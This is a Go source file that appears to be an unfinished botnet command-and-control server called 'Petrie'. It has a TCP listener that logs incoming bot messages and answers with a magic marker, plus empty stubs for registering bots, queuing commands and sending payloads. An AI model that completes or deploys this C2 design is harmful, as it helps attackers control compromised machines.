// Shoutout to for a helpful blogpost/example @donutdan4114
package main

import (
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"net"
	"os"
)

// HOST : server to listen on (pretty much always localhost)
var HOST = "192.168.206.183"

// PORT : port to listen on
var PORT = "5656"

// MAGIC : the shared hex bytes that will signify the start/end of each MAD payload
var MAGIC = []byte("AAAA")
var magicStr = genMagStr()

func genMagStr() string {
	dst := make([]byte, hex.DecodedLen(len(MAGIC)))
	n, _ := hex.Decode(dst, MAGIC)
	ret := string(dst[:n])
	return ret
}

func main() {

	l, err := net.Listen("tcp", HOST+":"+PORT)
	if err != nil {
		os.Exit(1)
	}

	defer l.Close()
	fmt.Println("Listening for Petrie connections on " + HOST + ":" + PORT)
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting: ", err.Error())
			os.Exit(1)
		}
		// Handle connections in a new goroutine.
		go connHandle(conn)
	}
}

func connHandle(conn net.Conn) {
	message, err := ioutil.ReadAll(conn)
	fmt.Printf("%s\n", message)
	if err != nil {
		fmt.Println("Error reading:", err.Error())
	}
	resp := string(magicStr) + "gottem"
	conn.Write([]byte(resp))
	conn.Close()
}

// take buffer from conn handler, turn it into a string
func decodePayload() string {
	return ""
}

// take string of payload, depending on mode/arguments: handle it
func handlePayload(payload string) bool {
	return true
}

// take params from bot and register it in the DB
func registerBot(uuid string, hostname string, interval int, delta int) bool {
	return true
}

// pull all commands from DB with associated uuid
func getCommand(uuid string) []string {
	return nil
}

// send the action result back to the DB for feedback tracking
func addResult(result string, actionid int) bool {
	return true
}

// generate the formatted and base64 encoded string, ready to be sent accross wire
func buildPayload(mode string, arguments string, actionid int) string {
	return ""
}

// send payload via defined connection
func sendPayload(conn net.Conn, payload string) bool {
	return true
}
